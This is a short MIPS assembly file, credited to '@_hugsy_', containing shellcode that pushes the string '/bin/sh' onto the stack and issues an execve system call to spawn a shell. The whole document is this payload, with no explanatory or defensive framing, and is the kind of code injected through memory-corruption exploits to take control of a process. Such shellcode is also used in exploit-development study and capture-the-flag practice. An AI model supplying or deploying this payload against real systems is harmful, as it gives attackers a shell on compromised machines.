;;;
;;; MIPS sys_execve("/bin/sh") shellcode
;;;
;;; @_hugsy_
;;;
    li $v0, 0x6e69622f
    sw $v0, 0($sp)
    li $v0, 0x0068732f
    sw $v0, 4($sp)
    li $v0, 11
    move $a0, $sp
    li $a1, 0
    li $a2, 0
    syscall
